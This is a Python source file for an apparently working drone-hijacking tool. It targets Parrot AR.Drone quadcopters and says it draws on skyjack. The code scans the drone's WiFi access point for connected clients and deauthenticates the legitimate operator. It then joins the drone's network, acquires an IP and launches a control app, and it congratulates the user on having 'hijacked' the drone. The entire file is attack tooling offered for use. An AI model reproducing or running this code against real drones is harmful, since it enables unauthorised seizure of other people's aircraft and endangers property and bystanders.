#! /usr/bin/env python3
#
# Parrot AR.Drone hacking tool
# Inspired from https://github.com/samyk/skyjack/
#

from predatordrone.wifi import WifiManager, AccessPoint, Client
from predatordrone.external_exec import do
from predatordrone.menu import Menu
import predatordrone.disp as disp
import re



# ===============
#    Constants
# ===============

nodejs        = "node"
controljs     = "app.js"
controljs_dir = "ardrone-webflight"




# ==================================
#    Parrot AR.Drone hacking tool
# ==================================

class ParrotHacker:

    def __init__(self, parrot_ap, wlan, mon):
        """ Initialize the Parrot hacker class. """
        # Init vars
        self.wlan = wlan
        self.mon  = mon
        self.ap   = parrot_ap
        self.clients = []

        # Init menu
        self.menu = Menu(
                    ("Hacking menu for", self.ap.short_str()),
                    ("Your choice:"),
                    exit_opt_msg   ="Go back to main menu (exit hacking menu)",
                    no_num_opts_msg="No client detected. Try to search for new connected clients!",
                    exit_on_ctrlc  =False
                )
        self.menu.add_static_opt('R', "Refresh clients list", self.search_new_clients)
        self.menu.add_static_opt('T', "Take control (no connected clients)", self.take_control)
        self.menu.add_static_opt('C', "Clear client list", self.clear_clients_list)


    def __str__(self):
        return self.ap.__str__()


    def __eq__(self, other):
        return isinstance(other, self.__class__) and self.ap.__eq__(other.ap)


    def hack(self):
        """ Hacks current AP. """
        # Search for clients
        self.search_new_clients()

        # Show menu
        self.menu.run()



    # =======================
    #    Client management
    # =======================

    def clear_clients_list(self):
        """ Clears client list. """

        self.menu.clear_numbered_opt()
        disp.info("Parrot hacking menu entries cleared")

        self.clients = []
        disp.info("Client list cleared")


    def search_new_clients(self):
        disp.info("Searching for connected clients to Parrot AP", self.ap.ssid)
        self.mon.search_clients(self.ap, self.register_client)


    def register_client(self, client):
        """ Register a client to this Parrot AP. """
        if client not in self.clients:
            self.clients.append(client)
            self.menu.add_numbered_opt(
                    ("Disconnect client", client.ip, "then take control"),
                    lambda: self.disconnect_then_control(client)
                )
            disp.item1("Found client on", client)



    # =====================
    #    Hacking methods
    # =====================

    def take_control(self):
        """ Takes control of the drone. """
        # Connect AP
        disp.info("Connecting to drone", self.ap.short_str())
        self.wlan.connect_access_point(self.ap)

        disp.info("Acquiring IP from drone")
        ip_ok = self.wlan.acquire_ip()

        if ip_ok:
            disp.info("Taking drone control")
            try:
                do("cd", controljs_dir, ';', nodejs, controljs, force_output=True)
            except KeyboardInterrupt:
                pass
            disp.info("Well done! You've hijacked the Parrot drone! :)")


    def disconnect_then_control(self, client):
        """ Disconnects a client then take control. """
        # Disconnect client
        disp.info("Disconnecting client", client)
        self.mon.deauth_client(client, self.ap)

        # Take control
        self.take_control()

